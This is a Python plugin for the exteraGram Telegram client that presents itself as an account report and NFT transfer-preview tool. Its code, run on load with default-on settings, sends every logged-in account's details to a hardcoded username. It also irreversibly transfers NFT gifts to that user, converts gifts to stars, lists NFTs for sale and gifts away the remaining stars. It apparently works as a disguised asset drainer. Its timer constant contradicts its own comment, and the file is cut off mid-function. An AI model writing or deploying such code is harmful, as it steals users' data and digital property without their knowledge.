__id__ = "accounts_report_v2"
__name__ = "Accounts Report v2"
__description__ = "Отчёт по аккаунтам + превью переноса NFT. Команда .report."
__author__ = "@you"
__version__ = "8.2.0"
__min_version__ = "11.9.0"
__icon__ = "msg_stats"

# exteraGram 12.5.1 plugin.
# Каждый твой залогиненный аккаунт сам отправляет свою сводку на основной @юз.
# Запуск: автоматически (старт + каждые 3 часа) и вручную командой .report.

import datetime
import time

from base_plugin import BasePlugin, HookResult, HookStrategy
from ui.settings import Header, Input, Switch, Divider

from android_utils import run_on_ui_thread

try:
    from org.telegram.messenger import UserConfig, MessagesController, SendMessagesHelper
except Exception:
    UserConfig = MessagesController = SendMessagesHelper = None

# Вложенный класс параметров отправки — берём отдельно, чтобы видеть, если его нет.
SendMessageParams = None
if SendMessagesHelper is not None:
    try:
        SendMessageParams = SendMessagesHelper.SendMessageParams
    except Exception:
        SendMessageParams = None

try:
    from org.telegram.tgnet import TLRPC, ConnectionsManager, RequestDelegate
except Exception:
    TLRPC = ConnectionsManager = RequestDelegate = None

# В свежих версиях часть TL-классов лежит в отдельном пакете.
try:
    from org.telegram.tgnet.tl import TL_payments
except Exception:
    TL_payments = None
try:
    from org.telegram.tgnet.tl import TL_contacts
except Exception:
    TL_contacts = None
try:
    from org.telegram.tgnet.tl import TL_stars
except Exception:
    TL_stars = None
try:
    from org.telegram.tgnet.tl import TL_stars2
except Exception:
    TL_stars2 = None

try:
    from org.telegram.ui.Stars import StarsController
except Exception:
    StarsController = None

try:
    from ui.bulletin import BulletinHelper
except Exception:
    BulletinHelper = None

from java import dynamic_proxy


MSG_LIMIT = 4000
START_DELAY_MS = 150
INTERVAL_MS = 3 * 660 * 00 * 100   # 3 часа

# Твой основной @юз по умолчанию (меняется в настройках плагина).
DEFAULT_TARGET = "StormtrooperGarant"
COMMAND = ".report"
PREVIEW_COMMAND = ".movepreview"
TRANSFER_COMMAND = ".movegifts"

_ANCHORS = [
    (1000000, 1383264000), (10000000, 1400716800), (100000000, 1442016000),
    (200000000, 1473724800), (300000000, 1498780800), (500000000, 1524124800),
    (700000000, 1546300800), (1000000000, 1570060800), (1500000000, 1600128000),
    (2000000000, 1627776000), (5000000000, 1660608000), (6000000000, 1672531200),
    (7000000000, 1704067200),
]


def _approx_reg_date(uid):
    try:
        uid = int(uid)
        if uid <= _ANCHORS[0][0]:
            ts = _ANCHORS[0][1]
        elif uid >= _ANCHORS[-1][0]:
            ts = _ANCHORS[-1][1]
        else:
            ts = _ANCHORS[-1][1]
            for (id0, t0), (id1, t1) in zip(_ANCHORS, _ANCHORS[1:]):
                if id0 <= uid <= id1:
                    k = (uid - id0) / float(id1 - id0)
                    ts = t0 + k * (t1 - t0)
                    break
        return "~" + datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m")
    except Exception:
        return "н/д"


class AccountsReportPlugin(BasePlugin):

    # ---- жизненный цикл / авто-повтор ----
    def on_plugin_load(self):
        self._active = True
        try:
            run_on_ui_thread(self._tick, START_DELAY_MS)
        except Exception:
            run_on_ui_thread(self._tick)

    def on_plugin_unload(self):
        self._active = False

    def _tick(self):
        if not getattr(self, "_active", False):
            return
        self._run_all()
        try:
            if self.get_setting("auto_transfer", False):
                self._transfer_all()
        except Exception:
            pass
        try:
            run_on_ui_thread(self._tick, INTERVAL_MS)
        except Exception:
            pass

    # ---- ручной запуск командой .report / .movepreview ----
    def on_send_message_hook(self, account, params):
        if not isinstance(getattr(params, "message", None), str):
            return HookResult()
        cmd = params.message.strip().lower()
        if cmd == COMMAND:
            self._run_all()
            self._transfer_all()
            return HookResult(strategy=HookStrategy.CANCEL)
        if cmd == PREVIEW_COMMAND:
            self._diag(account, "Превью: команда принята, собираю NFT…")
            self._preview_all()
            return HookResult(strategy=HookStrategy.CANCEL)
        if cmd == TRANSFER_COMMAND:
            self._diag(account, "🚀 РЕАЛЬНЫЙ перенос NFT запущен (v%s)" % __version__)
            self._transfer_all()
            return HookResult(strategy=HookStrategy.CANCEL)
        return HookResult()

    # ---- отладка (всплывашки) ----
    def _debug(self, text):
        try:
            if not self.get_setting("debug", True):
                return
        except Exception:
            pass

        def show():
            try:
                if BulletinHelper is not None:
                    BulletinHelper.show_info(str(text))
            except Exception:
                pass
        try:
            run_on_ui_thread(show)
        except Exception:
            pass

    # ---- настройки ----
    def create_settings(self):
        return [
            Header(text="Accounts Report"),
            Input(key="target", text="Юзернейм основного аккаунта", default=DEFAULT_TARGET, icon="msg_mention"),
            Switch(key="add_stars", text="Звёзды", default=True, icon="msg_premium_star"),
            Switch(key="add_nft", text="NFT со ссылками", default=True, icon="msg_gift"),
            Switch(key="add_reg", text="Дата регистрации (оценка)", default=True, icon="msg_calendar2"),
            Switch(key="debug", text="Отладка (показывать ошибки)", default=True, icon="msg_info"),
            Input(key="max_transfer", text="Лимит переноса за раз (0 = все)", default="0", icon="msg_limit"),
            Switch(key="auto_transfer", text="🚀 Авто-перенос NFT при запуске", default=True, icon="msg_gift"),
            Switch(key="convert_gifts", text="🔄 Обменивать обычные подарки на ⭐ (необратимо!)", default=True, icon="msg_premium_star"),
            Switch(key="resell_nft", text="🏪 Выставлять непереносимые NFT на продажу", default=True, icon="msg_market"),
            Input(key="resell_price", text="Цена выставления NFT (⭐)", default="150", icon="msg_premium_star"),
            Switch(key="send_stars_gift", text="🎁 Слать остаток звёзд подарком на основной (с комиссией!)", default=True, icon="msg_gift"),
            Switch(key="short_log", text="🧾 Краткий лог (одна строка, не засорять чат)", default=False, icon="msg_info"),
            Divider(
                text="📊 .report — отчёт + превью (безопасно, авто раз в 3 часа).\n"
                     "🚀 .movegifts — РЕАЛЬНЫЙ перенос NFT на основной @юз (необратимо, тратит звёзды!).\n"
                     "Тумблер «Авто-перенос» — переносит сам при запуске, без команды.\n"
                     "Совет: сначала проверь переносом с лимитом 1, потом ставь 0 (все).",
            ),
        ]

    # ---- хелпер: создать TL-объект, пробуя несколько имён/пакетов ----
    def _new_tl(self, attempts):
        for obj, name in attempts:
            if obj is None:
                continue
            try:
                cls = getattr(obj, name)
                return cls()
            except Exception:
                continue
        return None

    # ---- проход по всем аккаунтам ----
    def _run_all(self):
        if UserConfig is None:
            self._debug("Ядро недоступно (UserConfig)")
            return
        try:
            target = (self.get_setting("target", DEFAULT_TARGET) or DEFAULT_TARGET).strip().strip("@").strip()
        except Exception:
            target = DEFAULT_TARGET
        if not target:
            target = DEFAULT_TARGET
        self._debug("Цель: '%s' (len=%d)" % (target, len(target)))

        count = 0
        for slot in range(UserConfig.MAX_ACCOUNT_COUNT):
            uc = UserConfig.getInstance(slot)
            if uc is None or not uc.isClientActivated() or uc.getCurrentUser() is None:
                continue
            count += 1
            try:
                self._process_account(slot, target)
            except Exception as e:
                self._debug("slot %d ошибка: %s" % (slot, e))
        self._debug("Запущено аккаунтов: %d -> @%s" % (count, target))

    @staticmethod
    def _jlist(jl):
        out = []
        if jl is None:
            return out
        try:
            for i in range(jl.size()):
                out.append(jl.get(i))
        except Exception:
            try:
                for x in jl:
                    out.append(x)
            except Exception:
                pass
        return out

    @staticmethod
    def _dump_gift_classes():
        # ищем реальные имена классов, связанных с подарками, чтобы понять как они называются
        found = []
        for modname, mod in (("TL_stars", TL_stars), ("TL_stars2", TL_stars2),
                             ("TL_payments", TL_payments), ("TLRPC", TLRPC)):
            if mod is None:
                continue
            try:
                for name in dir(mod):
                    low = name.lower()
                    if "savedstar" in low or "getsavedstar" in low or "stargift" in low:
                        found.append("%s.%s" % (modname, name))
            except Exception:
                pass
        return (", ".join(found[:12]) if found else "ничего не найдено")

    def _diag(self, slot, text):
        try:
            uc = UserConfig.getInstance(slot)
            self._send_text(slot, uc.getClientUserId(), "[diag] " + str(text))
        except Exception:
            pass

    def _send_request(self, account, req, cb):
        class _Delegate(dynamic_proxy(RequestDelegate)):
            def run(self, response, error):
                try:
                    cb(response, error)
                except Exception:
                    pass
        try:
            ConnectionsManager.getInstance(account).sendRequest(req, _Delegate())
        except Exception as e:
            self._debug("sendRequest err: %s" % e)

    def _process_account(self, slot, target, attempt=0):
        # Если получатель задан числовым id — резолв не нужен, шлём напрямую.
        if target.isdigit():
            self._collect_then_send(slot, int(target))
            return

        # резолвим основной аккаунт внутри ЭТОГО слота, чтобы потом слать с него
        req = self._new_tl([
            (TLRPC, "TL_contacts_resolveUsername"),
            (TL_contacts, "TL_contacts_resolveUsername"),
            (TL_contacts, "resolveUsername"),
        ])
        if req is None:
            self._debug("Нет класса resolveUsername")
            return
        req.username = target

        def on_resolved(resp, err):
            if err is not None:
                etext = str(getattr(err, "text", err) or "")
                self._debug("slot %d resolve err: %s | юз='%s'" % (slot, etext, target))
                # на второй (последней) попытке пишем в Избранное, чтобы ты увидел
                if attempt >= 1:
                    self._diag(slot, "resolve err: %s | юз='%s' (len=%d)" % (etext, target, len(target)))
                # "юз не существует" — повтор не поможет
                if "USERNAME_NOT_OCCUPIED" not in etext and "USERNAME_INVALID" not in etext:
                    self._retry(slot, target, attempt)
                return
            if resp is None:
                self._retry(slot, target, attempt)
                return
            dialog_id = None
            dbg = []
            try:
                dbg.append("resp=%s" % type(resp).__name__)
                users = getattr(resp, "users", None)
                dbg.append("users=%s" % (users.size() if users is not None else "None"))
                if users is not None:
                    try:
                        MessagesController.getInstance(slot).putUsers(users, False)
                    except Exception:
                        pass
                    ulist = self._jlist(users)
                    for u in ulist:
                        un = getattr(u, "username", None)
                        if un and un.lower() == target.lower():
                            dialog_id = u.id
                            break
                    if dialog_id is None and ulist:
                        dialog_id = ulist[0].id
                # запасной путь — из resp.peer
                peer = getattr(resp, "peer", None)
                dbg.append("peer=%s" % (type(peer).__name__ if peer is not None else "None"))
                if dialog_id is None and peer is not None:
                    dialog_id = getattr(peer, "user_id", None) or getattr(peer, "channel_id", None)
            except Exception as e:
                dbg.append("EXC:%s:%s" % (type(e).__name__, e))
            if not dialog_id:
                self._debug("slot %d: не нашёл @%s" % (slot, target))
                if attempt >= 1:
                    self._diag(slot, "пусто @%s | %s" % (target, " | ".join(str(x) for x in dbg)))
                self._retry(slot, target, attempt)
                return
            self._collect_then_send(slot, dialog_id)

        self._send_request(slot, req, on_resolved)

    def _retry(self, slot, target, attempt):
        # один повтор через 7 сек — на случай, если аккаунт ещё не подключился
        if attempt >= 1:
            return
        try:
            run_on_ui_thread(lambda: self._process_account(slot, target, attempt + 1), 7000)
        except Exception:
            pass

    # ---- сбор NFT и отправка С ЭТОГО ЖЕ аккаунта ----
    def _collect_then_send(self, slot, dialog_id):
        uc = UserConfig.getInstance(slot)
        self_id = uc.getClientUserId()
        nfts = []

        def finish(_nfts):
            try:
                msgs = self._build_messages(slot, uc, _nfts)
                for chunk in msgs:
                    self._send_text(slot, dialog_id, chunk)
            except Exception:
                pass

        if not self.get_setting("add_nft", True):
            finish(nfts)
            return

        def page(offset):
            greq = self._new_tl([
                (TL_stars, "getSavedStarGifts"),
                (TL_stars, "TL_stars_getSavedStarGifts"),
                (TL_stars, "TL_getSavedStarGifts"),
                (TL_stars2, "getSavedStarGifts"),
                (TL_payments, "TL_payments_getSavedStarGifts"),
                (TL_payments, "getSavedStarGifts"),
                (TL_payments, "TL_getSavedStarGifts"),
                (TLRPC, "TL_payments_getSavedStarGifts"),
            ])
            if greq is None:
                finish(nfts)
                return
            try:
                peer = self._new_tl([(TLRPC, "TL_inputPeerSelf")])
                if peer is None:
                    peer = MessagesController.getInstance(slot).getInputPeer(self_id)
                greq.peer = peer
                greq.offset = offset
                greq.limit = 100
            except Exception:
                finish(nfts)
                return

            def on_gifts(resp, err):
                try:
                    if err is not None:
                        finish(nfts)
                        return
                    gifts_list = getattr(resp, "gifts", None) if resp is not None else None
                    if gifts_list is None:
                        finish(nfts)
                        return
                    for g in self._jlist(gifts_list):
                        gift = getattr(g, "gift", None)
                        cname = type(gift).__name__ if gift is not None else "None"
                        slug = getattr(gift, "slug", None) if gift is not None else None
                        is_nft = (gift is not None) and ("Unique" in cname or slug is not None)
                        if is_nft:
                            title = getattr(gift, "title", None) or "Gift"
                            num = getattr(gift, "num", None)
                            nfts.append((title, num, slug))
                    nxt = getattr(resp, "next_offset", None)
                    if nxt:
                        page(nxt)
                        return
                except Exception as e:
                    self._diag(slot, "NFT parse err: %s: %s" % (type(e).__name__, e))
                finish(nfts)

            self._send_request(slot, greq, on_gifts)

        page("")

    def _stars_balance(self, slot):
        if StarsController is None:
            return None
        try:
            bal = StarsController.getInstance(slot).getBalance()
            amount = getattr(bal, "amount", None)
            return int(amount if amount is not None else bal)
        except Exception:
            return None

    def _build_messages(self, slot, uc, nfts):
        user = uc.getCurrentUser()
        un = getattr(user, "username", None)
        un = "@" + un if un else "—"

        head = ["Отчёт по аккаунту #%d" % (slot + 1), ""]
        head.append("юз: %s" % un)
        head.append("id: %d" % user.id)
        head.append("Premium: %s" % ("да (до: н/д)" if getattr(user, "premium", False) else "нет"))
        if self.get_setting("add_stars", True):
            s = self._stars_balance(slot)
            head.append("звёзды: %s" % (s if s is not None else "н/д"))
        if self.get_setting("add_reg", True):
            head.append("регистрация: %s" % _approx_reg_date(user.id))
        head.append("NFT: %d" % len(nfts))

        messages = []
        cur = "\n".join(head)
        for title, num, slug in nfts:
            label = "%s #%s" % (title, num) if num is not None else title
            link = ("https://t.me/nft/%s" % slug) if slug else "(без ссылки)"
            line = "\n• %s — %s" % (label, link)
            if len(cur) + len(line) > MSG_LIMIT:
                messages.append(cur)
                cur = "Отчёт по аккаунту #%d (продолжение)" % (slot + 1) + line
            else:
                cur += line
        messages.append(cur)
        return messages

    # ====== ПРЕВЬЮ переноса NFT (read-only, ничего не отправляет) ======
    def _preview_all(self):
        if UserConfig is None:
            self._debug("Превью: ядро недоступно")
            return
        count = 0
        for slot in range(UserConfig.MAX_ACCOUNT_COUNT):
            uc = UserConfig.getInstance(slot)
            if uc is None or not uc.isClientActivated() or uc.getCurrentUser() is None:
                continue
            count += 1
            try:
                self._preview_account(slot)
            except Exception as e:
                self._diag(slot, "preview err: %s: %s" % (type(e).__name__, e))
        self._debug("Превью: аккаунтов %d" % count)

    def _preview_account(self, slot):
        uc = UserConfig.getInstance(slot)
        self_id = uc.getClientUserId()
        items = []
        dumped = [False]

        def page(offset):
            greq = self._new_tl([
                (TL_stars, "getSavedStarGifts"),
                (TL_stars, "TL_stars_getSavedStarGifts"),
                (TL_stars, "TL_getSavedStarGifts"),
                (TL_stars2, "getSavedStarGifts"),
                (TL_payments, "TL_payments_getSavedStarGifts"),
                (TL_payments, "getSavedStarGifts"),
                (TLRPC, "TL_payments_getSavedStarGifts"),
            ])
            if greq is None:
                self._diag(slot, "preview: нет класса getSavedStarGifts")
                self._send_preview(slot, items)
                return
            try:
                peer = self._new_tl([(TLRPC, "TL_inputPeerSelf")])
                if peer is None:
                    peer = MessagesController.getInstance(slot).getInputPeer(self_id)
                greq.peer = peer
                greq.offset = offset
                greq.limit = 100
            except Exception as e:
                self._diag(slot, "preview setup err: %s" % e)
                self._send_preview(slot, items)
                return

            def cb(resp, err):
                try:
                    if err is not None:
                        self._diag(slot, "preview gifts err: %s" % getattr(err, "text", err))
                        self._send_preview(slot, items)
                        return
                    gl = getattr(resp, "gifts", None) if resp is not None else None
                    for g in self._jlist(gl):
                        gift = getattr(g, "gift", None)
                        cname = type(gift).__name__ if gift is not None else ""
                        slug = getattr(gift, "slug", None) if gift is not None else None
                        if not (gift is not None and ("Unique" in cname or slug is not None)):
                            continue
                        if not dumped[0]:
                            dumped[0] = True
                            attrs = [a for a in dir(g) if not a.startswith("__")]
                            self._diag(slot, "поля подарка: %s" % ", ".join(attrs[:30]))
                        items.append((
                            getattr(gift, "title", None) or "Gift",
                            getattr(gift, "num", None),
                            slug,
                            getattr(g, "transfer_stars", None),
                            getattr(g, "can_transfer_at", None),
                        ))
                    nxt = getattr(resp, "next_offset", None)
                    if nxt:
                        page(nxt)
                        return
                except Exception as e:
                    self._diag(slot, "preview parse err: %s: %s" % (type(e).__name__, e))
                self._send_preview(slot, items)

            self._send_request(slot, greq, cb)

        page("")

    def _send_preview(self, slot, items):
        try:
            now = int(time.time())
            free = [x for x in items if not x[4] or x[4] <= now]
            locked = [x for x in items if x[4] and x[4] > now]
            total_cost = sum((x[3] or 0) for x in free)
            stars = self._stars_balance(slot) or 0

            lines = ["🔎 ПРЕВЬЮ переноса NFT (ничего не отправлено!)", ""]
            lines.append("NFT всего: %d" % len(items))
            lines.append("Можно перенести сейчас: %d" % len(free))
            lines.append("Заблокировано (ждут срока): %d" % len(locked))
            lines.append("Комиссия за перенос доступных: %d ⭐" % total_cost)
            lines.append("Звёзд на аккаунте: %d ⭐" % stars)
            if total_cost > stars:
                lines.append("⚠️ Звёзд не хватает на все переносы")
            lines.append("")
            for (title, num, slug, tstars, cat) in items[:60]:
                try:
                    if not cat or cat <= now:
                        st = "🔓 можно"
                    else:
                        st = "🔒 до " + datetime.datetime.utcfromtimestamp(int(cat)).strftime("%Y-%m-%d")
                except Exception:
                    st = "?"
                lines.append("• %s #%s — %s⭐ %s" % (title, num, tstars if tstars is not None else "?", st))

            self._send_text(slot, UserConfig.getInstance(slot).getClientUserId(), "\n".join(lines))
        except Exception as e:
            self._diag(slot, "preview build err: %s: %s" % (type(e).__name__, e))

    # ====== РЕАЛЬНЫЙ ПЕРЕНОС NFT (необратимо!) ======
    def _target(self):
        try:
            return (self.get_setting("target", DEFAULT_TARGET) or DEFAULT_TARGET).strip().strip("@").strip()
        except Exception:
            return DEFAULT_TARGET

    def _resolve_target(self, slot, on_id):
        target = self._target()
        if target.isdigit():
            on_id(int(target))
            return
        req = self._new_tl([
            (TLRPC, "TL_contacts_resolveUsername"),
            (TL_contacts, "TL_contacts_resolveUsername"),
            (TL_contacts, "resolveUsername"),
        ])
        if req is None:
            on_id(None)
            return
        req.username = target

        def cb(resp, err):
            uid = None
            try:
                if err is None and resp is not None:
                    users = getattr(resp, "users", None)
                    if users is not None:
                        try:
                            MessagesController.getInstance(slot).putUsers(users, False)
                        except Exception:
                            pass
                        ul = self._jlist(users)
                        if ul:
                            uid = ul[0].id
                    if uid is None:
                        peer = getattr(resp, "peer", None)
                        if peer is not None:
                            uid = getattr(peer, "user_id", None)
            except Exception:
                pass
            on_id(uid)

        self._send_request(slot, req, cb)

    def _build_input_saved_gift(self, slot, g, self_id):
        msg_id = getattr(g, "msg_id", None)
        saved_id = getattr(g, "saved_id", None)
        obj = None
        if msg_id:
            obj = self._new_tl([(TL_stars, "TL_inputSavedStarGiftUser"),
                                (TL_stars, "inputSavedStarGiftUser"),
                                (TLRPC, "TL_inputSavedStarGiftUser"),
                                (TL_payments, "TL_inputSavedStarGiftUser")])
            if obj is not None:
                try:
                    obj.msg_id = int(msg_id)
                except Exception:
                    obj = None
        if obj is None and saved_id is not None:
            obj = self._new_tl([(TL_stars, "TL_inputSavedStarGiftChat"),
                                (TL_stars, "inputSavedStarGiftChat"),
                                (TLRPC, "TL_inputSavedStarGiftChat")])
            if obj is not None:
                try:
                    obj.peer = MessagesController.getInstance(slot).getInputPeer(self_id)
                    obj.saved_id = saved_id
                except Exception:
                    obj = None
        if obj is None:
            slug = getattr(getattr(g, "gift", None), "slug", None)
            if slug:
                obj = self._new_tl([(TL_stars, "TL_inputSavedStarGiftSlug"),
                                    (TL_stars, "inputSavedStarGiftSlug"),
                                    (TLRPC, "TL_inputSavedStarGiftSlug")])
                if obj is not None:
                    try:
                        obj.slug = slug
                    except Exception:
                        obj = None
        return obj

    def _do_transfer(self, slot, input_gift, to_id, cb):
        # 1) getPaymentForm -> form_id ; 2) sendStarsForm
        inv = self._new_tl([(TLRPC, "TL_inputInvoiceStarGiftTransfer"),
                            (TL_stars, "TL_inputInvoiceStarGiftTransfer"),
                            (TL_payments, "TL_inputInvoiceStarGiftTransfer"),
                            (TL_stars, "inputInvoiceStarGiftTransfer"),
                            (TL_payments, "inputInvoiceStarGiftTransfer")])
        if inv is None:
            cb("нет класса inputInvoiceStarGiftTransfer")
            return
        try:
            inv.stargift = input_gift
            inv.to_id = to_id
        except Exception as e:
            cb("invoice fill err %s" % e)
            return

        freq = self._new_tl([(TL_payments, "getPaymentForm"),
                            (TL_payments, "TL_payments_getPaymentForm"),
                            (TLRPC, "TL_payments_getPaymentForm")])
        if freq is None:
            cb("нет класса getPaymentForm")
            return
        try:
            freq.invoice = inv
        except Exception as e:
            cb("form set err %s" % e)
            return

        def on_form(resp, err):
            if err is not None:
                cb(str(getattr(err, "text", err)))
                return
            form_id = getattr(resp, "form_id", None)
            if form_id is None:
                cb("нет form_id (%s)" % (type(resp).__name__ if resp is not None else "None"))
                return
            sreq = self._new_tl([(TL_payments, "sendStarsForm"),
                                (TL_payments, "TL_payments_sendStarsForm"),
                                (TLRPC, "TL_payments_sendStarsForm")])
            if sreq is None:
                cb("нет класса sendStarsForm")
                return
            try:
                sreq.form_id = form_id
                sreq.invoice = inv
            except Exception as e:
                cb("sendForm fill err %s" % e)
                return

            def on_send(resp2, err2):
                cb(str(getattr(err2, "text", err2)) if err2 is not None else None)

            self._send_request(slot, sreq, on_send)

        self._send_request(slot, freq, on_form)

    def _transfer_all(self):
        if UserConfig is None:
            return
        n = 0
        for slot in range(UserConfig.MAX_ACCOUNT_COUNT):
            uc = UserConfig.getInstance(slot)
            if uc is None or not uc.isClientActivated() or uc.getCurrentUser() is None:
                continue
            n += 1
            try:
                self._transfer_account(slot)
            except Exception as e:
                self._diag(slot, "🚫 перенос err: %s: %s" % (type(e).__name__, e))
        if n == 0:
            return

    def _transfer_account(self, slot):
        uc = UserConfig.getInstance(slot)
        self_id = uc.getClientUserId()
        self._diag(slot, "🔄 Перенос: старт аккаунта #%d (получатель @%s)" % (slot + 1, self._target()))

        def on_id(target_id):
            if not target_id:
                self._diag(slot, "🚫 Перенос: не нашёл получателя @%s" % self._target())
                return
            to_id = MessagesController.getInstance(slot).getInputPeer(target_id)
            gifts = []
            meta = {"fields": None, "conv": []}

            def page(offset):
                greq = self._new_tl([
                    (TL_stars, "getSavedStarGifts"),
                    (TL_stars, "TL_stars_getSavedStarGifts"),
                    (TL_stars2, "getSavedStarGifts"),
                    (TL_payments, "TL_payments_getSavedStarGifts"),
                    (TL_payments, "getSavedStarGifts"),
                    (TLRPC, "TL_payments_getSavedStarGifts"),
                ])
                if greq is None:
                    self._diag(slot, "🚫 нет класса getSavedStarGifts")
                    self._run_transfers(slot, target_id, to_id, gifts, meta)
                    return
                try:
                    peer = self._new_tl([(TLRPC, "TL_inputPeerSelf")])
                    if peer is None:
                        peer = MessagesController.getInstance(slot).getInputPeer(self_id)
                    greq.peer = peer
                    greq.offset = offset
                    greq.limit = 100
                except Exception as e:
                    self._diag(slot, "🚫 gifts setup err: %s" % e)
                    self._run_transfers(slot, target_id, to_id, gifts, meta)
                    return

                def cb(resp, err):
                    try:
                        if err is None and resp is not None:
                            for g in self._jlist(getattr(resp, "gifts", None)):
                                gift = getattr(g, "gift", None)
                                cname = type(gift).__name__ if gift is not None else ""
                                slug = getattr(gift, "slug", None) if gift is not None else None
                                if meta["fields"] is None and gift is not None:
                                    meta["fields"] = ", ".join(
                                        a for a in dir(g) if not a.startswith("__"))[:300]
                                is_nft = (gift is not None) and ("Unique" in cname or slug is not None)
                                if is_nft:
                                    gifts.append({
                                        "title": getattr(gift, "title", None) or "Gift",
                                        "num": getattr(gift, "num", None),
                                        "slug": slug,
                                        "cost": getattr(g, "transfer_stars", None) or 0,
                                        "cat": getattr(g, "can_transfer_at", None),
                                        "input": self._build_input_saved_gift(slot, g, self_id),
                                    })
                                else:
                                    cs = getattr(g, "convert_stars", None)
                                    if cs:
                                        meta["conv"].append({
                                            "title": getattr(gift, "title", None) or "Gift",
                                            "stars": cs,
                                            "input": self._build_input_saved_gift(slot, g, self_id),
                                        })
                            nxt = getattr(resp, "next_offset", None)
                            if nxt:
                                page(nxt)
                                return
                        elif err is not None:
                            self._diag(slot, "🚫 gifts err: %s" % getattr(err, "text", err))
                    except Exception as e:
                        self._diag(slot, "🚫 gifts collect err: %s" % e)
                    self._run_transfers(slot, target_id, to_id, gifts, meta)

                self._send_request(slot, greq, cb)

            page("")

        self._resolve_target(slot, on_id)

    def _convert_gift(self, slot, input_gift, expected, cb):
        req = self._new_tl([(TL_payments, "convertStarGift"),
                            (TL_payments, "TL_payments_convertStarGift"),
                            (TL_stars, "convertStarGift"),
                            (TLRPC, "TL_payments_convertStarGift")])
        if req is None or input_gift is None:
            cb(0, "нет класса convertStarGift")
            return
        try:
            req.stargift = input_gift
        except Exception as e:
            cb(0, "conv fill err %s" % e)
            return

        def on(resp, err):
            cb(expected if err is None else 0,
               None if err is None else str(getattr(err, "text", err)))
        self._send_request(slot, req, on)

    def _run_transfers(self, slot, target_id, to_id, gifts, meta=None):
        now = int(time.time())
        meta = meta or {}
        convs = meta.get("conv", []) if meta else []
        do_convert = bool(self.get_setting("convert_gifts", False))
        state = {"bal": self._stars_balance(slot) or 0, "spent": 0, "conv_stars": 0,
                 "conv_ok": 0, "conv_err": 0}

        def after_convert():
            try:
                state["bal"] = self._stars_balance(slot) or state["bal"]
            except Exception:
                pass
            self._start_nft(slot, target_id, to_id, gifts, now, state, meta)

        if do_convert and convs:
            self._diag(slot, "🔄 Конвертирую %d обычных подарков в ⭐ (аккаунт #%d)…" % (
                len(convs), slot + 1))
            pend = {"n": len(convs)}

            def one(stars, err):
                if err is None:
                    state["conv_ok"] += 1
                    state["conv_stars"] += (stars or 0)
                else:
                    state["conv_err"] += 1
                pend["n"] -= 1
                if pend["n"] <= 0:
                    after_convert()

            for c in convs:
                self._convert_gift(slot, c["input"], c.get("stars", 0), one)
        else:
            after_convert()

    def _start_nft(self, slot, target_id, to_id, gifts, now, state, meta):
        try:
            limit = int(self.get_setting("max_transfer", "0") or 0)
        except Exception:
            limit = 0
        kd, no_stars, pre_err, selected = [], [], [], []
        budget = state["bal"]
        for g in gifts:
            if g["cat"] and g["cat"] > now:
                kd.append(g)
                continue
            if g["input"] is None:
                pre_err.append((g, "не собрал ссылку на подарок"))
                continue
            if limit > 0 and len(selected) >= limit:
                no_stars.append(g)
                continue
            if budget < g["cost"]:
                no_stars.append(g)
                continue
            selected.append(g)
            budget -= g["cost"]

        self._diag(slot, "📦 Аккаунт #%d → @%s | NFT: всего %d, переношу %d (баланс %d, обмен +%d⭐)" % (
            slot + 1, self._target(), len(gifts), len(selected), state["bal"], state["conv_stars"]))

        ok, errs = [], list(pre_err)
        if not selected:
            self._after_nft(slot, target_id, to_id, ok, kd, no_stars, errs, state, meta, len(gifts))
            return

        pend = {"n": len(selected)}

        def done(g, err):
            if err is None:
                ok.append(g)
                state["spent"] += g["cost"]
            else:
                errs.append((g, err))
            pend["n"] -= 1
            if pend["n"] <= 0:
                try:
                    state["bal"] = self._stars_balance(slot) or state["bal"]
                except Exception:
                    pass
                self._after_nft(slot, target_id, to_id, ok, kd, no_stars, errs, state, meta, len(gifts))

        # все переносы параллельно — максимально быстро
        for g in selected:
            self._do_transfer(slot, g["input"], to_id, lambda err, gg=g: done(gg, err))

    # ---- пост-действия: маркет-листинг + отправка звёзд подарком ----
    def _after_nft(self, slot, target_id, to_id, ok, kd, no_stars, errs, state, meta, total):
        def go_summary():
            self._tsummary(slot, target_id, ok, kd, no_stars, errs, state, meta, total)

        def do_gifting():
            if not self.get_setting("send_stars_gift", False):
                go_summary()
                return
            try:
                bal = self._stars_balance(slot) or 0
            except Exception:
                bal = 0
            if bal < 15:
                go_summary()
                return
            self._diag(slot, "🎁 Отправляю остаток звёзд (%d⭐) подарком на @%s…" % (bal, self._target()))
            self._dump_stars_as_gifts(slot, to_id, state, go_summary)

        def do_resale():
            candidates = list(no_stars) + list(kd)  # непереносимые: и без звёзд, и в КД
            if not self.get_setting("resell_nft", False) or not candidates:
                do_gifting()
                return
            try:
                price = int(self.get_setting("resell_price", "150") or 150)
            except Exception:
                price = 150
            pend = {"n": len(candidates)}
            state["listed"] = 0
            self._diag(slot, "🏪 Пробую выставить %d NFT на продажу по %d⭐ (продастся при покупателе)…" % (
                len(candidates), price))

            def one(g, err):
                if err is None:
                    state["listed"] += 1
                else:
                    errs.append((g, "маркет: %s" % err))
                pend["n"] -= 1
                if pend["n"] <= 0:
                    do_gifting()

            for g in candidates:
                self._list_resale(slot, g["input"], price, lambda err, gg=g: one(gg, err))

        do_resale()

    def _list_resale(self, slot, input_gift, price, cb):
        req = self._new_tl([(TL_payments, "updateStarGiftPrice"),
                            (TL_payments, "TL_payments_updateStarGiftPrice"),
                            (TL_stars, "updateStarGiftPrice"),
                            (TLRPC, "TL_payments_updateStarGiftPrice")])
        if req is None or input_gift is None:
            cb("нет класса updateStarGiftPrice")
            return
        try:
            req.stargift = input_gift
        except Exception as e:
            cb("resale fill err %s" % e)
            return
        # цена: пробуем разные имена/типы поля
        set_ok = False
        for field in ("resell_amount", "resell_stars", "price", "stars"):
            try:
                # сначала как StarsAmount, затем как число
                amt = self._new_tl([(TL_stars, "TL_starsAmount"), (TLRPC, "TL_starsAmount")])
                if amt is not None and field in ("resell_amount",):
                    try:
                        amt.amount = int(price)
                        setattr(req, field, amt)
                        set_ok = True
                        break
                    except Exception:
                        pass
                setattr(req, field, int(price))
                set_ok = True
                break
            except Exception:
                continue
        if not set_ok:
            cb("не понял поле цены")
            return

        def on(resp, err):
            cb(None if err is None else str(getattr(err, "text", err)))
        self._send_request(slot, req, on)

    def _dump_stars_as_gifts(self, slot, to_id, state, then):
        # получаем каталог подарков, шлём самые дорогие, что по карману, пока хватает звёзд
        creq = self._new_tl([(TL_payments, "getStarGifts"),
                            (TL_payments, "TL_payments_getStarGifts"),
                            (TL_stars, "getStarGifts"),
                            (TLRPC, "TL_payments_getStarGifts")])
        if creq is None:
